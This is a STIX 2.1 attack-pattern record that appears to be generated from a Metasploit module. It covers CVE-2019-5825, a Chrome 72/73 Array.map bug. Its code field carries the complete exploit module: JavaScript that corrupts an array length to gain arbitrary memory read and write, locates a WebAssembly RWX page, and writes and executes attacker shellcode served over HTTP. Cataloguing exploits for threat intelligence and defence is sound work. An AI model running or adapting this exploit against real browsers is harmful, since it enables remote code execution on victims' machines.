{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7797840-18af-49c4-9dad-4b0d1f23a41b",
    "created": "2024-08-14T17:06:09.376319Z",
    "modified": "2024-08-14T17:06:09.376323Z",
    "name": "Google Chrome 72 and 73 Array.map exploit",
    "description": " This module exploits an issue in Chrome 73.0.3683.86 (64 bit). The exploit corrupts the length of a float in order to modify the backing store of a typed array. The typed array can then be used to read and write arbitrary memory. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload. The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/chrome_array_map.rb",
            "external_id": "chrome_array_map.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5825"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=941743"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/exodusintel/Chromium-941743"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/"
        },
        {
            "source_name": "reference",
            "url": "https://lordofpwn.kr/cve-2019-5825-v8-exploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer::BrowserExploit\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Google Chrome 72 and 73 Array.map exploit',\n        'Description' => %q{\n          This module exploits an issue in Chrome 73.0.3683.86 (64 bit).\n          The exploit corrupts the length of a float in order to modify the backing store\n          of a typed array. The typed array can then be used to read and write arbitrary\n          memory. The exploit then uses WebAssembly in order to allocate a region of RWX\n          memory, which is then replaced with the payload.\n          The payload is executed within the sandboxed renderer process, so the browser\n          must be run with the --no-sandbox option for the payload to work correctly.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'dmxcsnsbh', # discovery\n          'Istv\u00e1n Kurucsai', # exploit\n          'timwr', # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2019-5825'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=941743'],\n          ['URL', 'https://github.com/exodusintel/Chromium-941743'],\n          ['URL', 'https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/'],\n          ['URL', 'https://lordofpwn.kr/cve-2019-5825-v8-exploit/'],\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Stability' => [CRASH_SAFE]\n        },\n        'Arch' => [ ARCH_X64 ],\n        'Platform' => ['windows', 'osx'],\n        'DefaultTarget' => 0,\n        'Targets' => [ [ 'Automatic', {} ] ],\n        'DisclosureDate' => '2019-03-07'\n      )\n    )\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    escaped_payload = Rex::Text.to_unescape(payload.encoded)\n    jscript = %^\n// HELPER FUNCTIONS\nlet conversion_buffer = new ArrayBuffer(8);\nlet float_view = new Float64Array(conversion_buffer);\nlet int_view = new BigUint64Array(conversion_buffer);\nBigInt.prototype.hex = function() {\n    return '0x' + this.toString(16);\n};\nBigInt.prototype.i2f = function() {\n    int_view[0] = this;\n    return float_view[0];\n}\nBigInt.prototype.smi2f = function() {\n    int_view[0] = this << 32n;\n    return float_view[0];\n}\nNumber.prototype.f2i = function() {\n    float_view[0] = this;\n    return int_view[0];\n}\nNumber.prototype.f2smi = function() {\n    float_view[0] = this;\n    return int_view[0] >> 32n;\n}\nNumber.prototype.i2f = function() {\n    return BigInt(this).i2f();\n}\nNumber.prototype.smi2f = function() {\n    return BigInt(this).smi2f();\n}\n\n// *******************\n// Exploit starts here\n// *******************\n// This call ensures that TurboFan won't inline array constructors.\nArray(2**30);\n\n// we are aiming for the following object layout\n// [output of Array.map][packed float array][typed array][Object]\n// First the length of the packed float array is corrupted via the original vulnerability,\n// then the float array can be used to modify the backing store of the typed array, thus achieving AARW.\n// The Object at the end is used to implement addrof\n\n// offset of the length field of the float array from the map output\nconst float_array_len_offset = 23;\n// offset of the length field of the typed array\nconst tarray_elements_len_offset = 24;\n// offset of the address pointer of the typed array\nconst tarray_elements_addr_offset = tarray_elements_len_offset + 1;\nconst obj_prop_b_offset = 33;\n\n// Set up a fast holey smi array, and generate optimized code.\nlet a = [1, 2, ,,, 3];\nlet cnt = 0;\nvar tarray;\nvar float_array;\nvar obj;\n\nfunction mapping(a) {\n  function cb(elem, idx) {\n    if (idx == 0) {\n      float_array = [0.1, 0.2];\n\n      tarray = new BigUint64Array(2);\n      tarray[0] = 0x41414141n;\n      tarray[1] = 0x42424242n;\n      obj = {'a': 0x31323334, 'b': 1};\n      obj['b'] = obj;\n    }\n\n    if (idx > float_array_len_offset) {\n      // minimize the corruption for stability\n      throw \"stop\";\n    }\n    return idx;\n  }\n  return a.map(cb);\n}\n\nfunction get_rw() {\n  for (let i = 0; i < 10 ** 5; i++) {\n    mapping(a);\n  }\n\n  // Now lengthen the array, but ensure that it points to a non-dictionary\n  // backing store.\n  a.length = (32 * 1024 * 1024)-1;\n  a.fill(1, float_array_len_offset, float_array_len_offset+1);\n  a.fill(1, float_array_len_offset+2);\n\n  a.push(2);\n  a.length += 500;\n\n  // Now, the non-inlined array constructor should produce an array with\n  // dictionary elements: causing a crash.\n  cnt = 1;\n  try {\n    mapping(a);\n  } catch(e) {\n    // relative RW from the float array from this point on\n    let sane = sanity_check()\n    print('sanity_check == ', sane);\n    print('len+3: ' + float_array[tarray_elements_len_offset+3].f2i().toString(16));\n    print('len+4: ' + float_array[tarray_elements_len_offset+4].f2i().toString(16));\n    print('len+8: ' + float_array[tarray_elements_len_offset+8].f2i().toString(16));\n\n    let original_elements_ptr = float_array[tarray_elements_len_offset+1].f2i() - 1n;\n    print('original elements addr: ' + original_elements_ptr.toString(16));\n    print('original elements value: ' + read8(original_elements_ptr).toString(16));\n    print('addrof(Object): ' + addrof(Object).toString(16));\n  }\n}\n\nfunction sanity_check() {\n  success = true;\n  success &= float_array[tarray_elements_len_offset+3].f2i() == 0x41414141;\n  success &= float_array[tarray_elements_len_offset+4].f2i() == 0x42424242;\n  success &= float_array[tarray_elements_len_offset+8].f2i() == 0x3132333400000000;\n  return success;\n}\n\nfunction read8(addr) {\n  let original = float_array[tarray_elements_len_offset+1];\n  float_array[tarray_elements_len_offset+1] = (addr - 0x1fn).i2f();\n  let result = tarray[0];\n  float_array[tarray_elements_len_offset+1] = original;\n  return result;\n}\n\nfunction write8(addr, val) {\n  let original = float_array[tarray_elements_len_offset+1];\n  float_array[tarray_elements_len_offset+1] = (addr - 0x1fn).i2f();\n  tarray[0] = val;\n  float_array[tarray_elements_len_offset+1] = original;\n}\n\nfunction addrof(o) {\n  obj['b'] = o;\n  return float_array[obj_prop_b_offset].f2i();\n}\n\nvar wfunc = null;\nvar shellcode = unescape(\"#{escaped_payload}\");\n\nfunction get_wasm_func() {\n  var importObject = {\n      imports: { imported_func: arg => print(arg) }\n  };\n  bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];\n  wasm_code = new Uint8Array(bc);\n  wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);\n  return wasm_mod.exports.exported_func;\n}\n\nfunction rce() {\n  let wasm_func = get_wasm_func();\n  wfunc = wasm_func;\n  // traverse the JSFunction object chain to find the RWX WebAssembly code page\n  let wasm_func_addr = addrof(wasm_func) - 1n;\n  print('wasm: ' + wasm_func_addr);\n  if (wasm_func_addr == 2) {\n    print('Failed, retrying...');\n    location.reload();\n    return;\n  }\n\n  let sfi = read8(wasm_func_addr + 12n*2n) - 1n;\n  print('sfi: ' + sfi.toString(16));\n  let WasmExportedFunctionData = read8(sfi + 4n*2n) - 1n;\n  print('WasmExportedFunctionData: ' + WasmExportedFunctionData.toString(16));\n\n  let instance = read8(WasmExportedFunctionData + 8n*2n) - 1n;\n  print('instance: ' + instance.toString(16));\n\n  //let rwx_addr = read8(instance + 0x108n);\n  let rwx_addr = read8(instance + 0xf8n) + 0n; // Chrome/73.0.3683.86\n  //let rwx_addr = read8(instance + 0xe0n) + 18n; // Chrome/69.0.3497.100\n  //let rwx_addr = read8(read8(instance - 0xc8n) + 0x53n); // Chrome/68.0.3440.84\n  print('rwx: ' + rwx_addr.toString(16));\n\n  // write the shellcode to the RWX page\n  if (shellcode.length % 2 != 0) {\n    shellcode += \"\\u9090\";\n  }\n\n  for (let i = 0; i < shellcode.length; i += 2) {\n    write8(rwx_addr + BigInt(i*2), BigInt(shellcode.charCodeAt(i) + shellcode.charCodeAt(i + 1) * 0x10000));\n  }\n\n  // invoke the shellcode\n  wfunc();\n}\n\n\nfunction exploit() {\n  print(\"Exploiting...\");\n  get_rw();\n  rce();\n}\n\nexploit();\n^\n\n    jscript = add_debug_print_js(jscript)\n    html = %(\n<html>\n<head>\n<script>\n#{jscript}\n</script>\n</head>\n<body>\n</body>\n</html>\n    )\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-03-07",
    "x_mitre_platforms": [
        "['windows', 'osx']"
    ]
}